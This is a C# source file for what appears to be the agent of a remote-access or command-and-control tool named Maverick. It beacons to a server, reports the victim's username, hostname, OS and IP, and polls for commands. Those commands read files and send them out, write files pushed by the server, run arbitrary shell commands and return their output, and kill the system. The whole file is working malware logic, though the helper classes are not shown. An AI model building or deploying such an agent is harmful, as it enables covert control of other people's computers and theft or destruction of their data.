using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;

namespace Maverick.Agent
{
    public static class CommandSender
    {
        private static bool isRegistry = false;
        private static readonly string BaseURL = "https://127.0.0.1:8000";

        private static int InternalID = 0;

        private static readonly string LocalIP = GetIpv4();


        private static string GetIpv4()
        {
            string localIP = "127.0.0.1"; // fallback
            var host = Dns.GetHostEntry(Dns.GetHostName());

            foreach (var ip in host.AddressList)
            {
                if (ip.AddressFamily == AddressFamily.InterNetwork)
                {
                    localIP = ip.ToString();
                    break;
                }
            }
            return localIP;
        }

        private static byte[] GenerateClientInfoPayload()
        {
            InfoClientModel info = new InfoClientModel
            {
                InternalID = InternalID,
                ClientID = Guid.NewGuid().ToString(),
                Username = Environment.UserName,
                Hostname = Environment.MachineName,
                OSversion = Environment.OSVersion.ToString(),
                ClientVersion = "1.0.0",
                NumOfMonitors = System.Windows.Forms.Screen.AllScreens.Length,
                ClientIP = LocalIP,
            };
            return Encoding.UTF8.GetBytes(System.Text.Json.JsonSerializer.Serialize(info));
        }

        private static byte[] GenerateResponseCommand(CommandTypes type, byte[] Data)
        {
            CommandRequestModel command = new CommandRequestModel
            {
                InternalID = InternalID,
                ActionType = type,
                Data = Data,
            };
            return Encoding.UTF8.GetBytes(System.Text.Json.JsonSerializer.Serialize(command));
        }

        private static List<byte[]> commandQueue = new List<byte[]>();

        public static async Task BeaconingAsync()
        {
            if (!isRegistry)
            {
                //do registry
                var info = GenerateClientInfoPayload();
                var result = await TrafficFunction.SendDataAsync(BaseURL + "/api/new", info);
                if (result == null) return;
                var responseString = Encoding.UTF8.GetString(result);
                if (int.TryParse(responseString, out InternalID))
                    isRegistry = true;
            }
            
            var newCommand = await TrafficFunction.SendDataAsync(BaseURL + "/api/get", BitConverter.GetBytes(InternalID));
            if (newCommand != null && newCommand.Length > 0)
            {
                var Command = System.Text.Json.JsonSerializer.Deserialize<CommandRequestModel>(newCommand);
                switch (Command.ActionType)
                {
                    case CommandTypes.INFOCLIENT:
                        {
                            var infoData = GenerateClientInfoPayload();
                            await TrafficFunction.SendDataAsync(BaseURL + "/api/post", infoData);
                            break;
                        }
                    case CommandTypes.GETFILE:
                        {
                            var fileData = ActionFunction.PerformReadFile(Command.Command);
                            var toSend = GenerateResponseCommand(CommandTypes.GETFILE, fileData);
                            await TrafficFunction.SendDataAsync(BaseURL + "/api/post", toSend);
                            break;
                        }
                    case CommandTypes.SENDFILE:
                        {
                            var success = ActionFunction.PerformWriteFile(Command.Command, Command.Data);
                            var response = Encoding.UTF8.GetBytes(success ? "Ok" : "");
                            var toSend = GenerateResponseCommand(CommandTypes.SENDFILE, response);
                            commandQueue.Add(toSend);
                            await TrafficFunction.SendDataAsync(BaseURL + "/api/post", toSend);
                            break;
                        }
                    case CommandTypes.DOCOMMAND:
                        {
                            var output = ActionFunction.PerformDoCommand(Command.Command);
                            var toSend = GenerateResponseCommand(CommandTypes.DOCOMMAND, output);
                            commandQueue.Add(toSend);
                            await TrafficFunction.SendDataAsync(BaseURL + "/api/post", toSend);
                            break;
                        }
                    case CommandTypes.KILLAPPLICATION:
                        {
                            var toSend = GenerateResponseCommand(CommandTypes.KILLAPPLICATION, Encoding.UTF8.GetBytes("Ok"));
                            await TrafficFunction.SendDataAsync(BaseURL + "/api/post", toSend);
                            ActionFunction.PerformKillSystem();
                            break;
                        }
                    default:
                        {
                            // Unknown command
                            break;
                        }
                }
            }
        }
    }
}
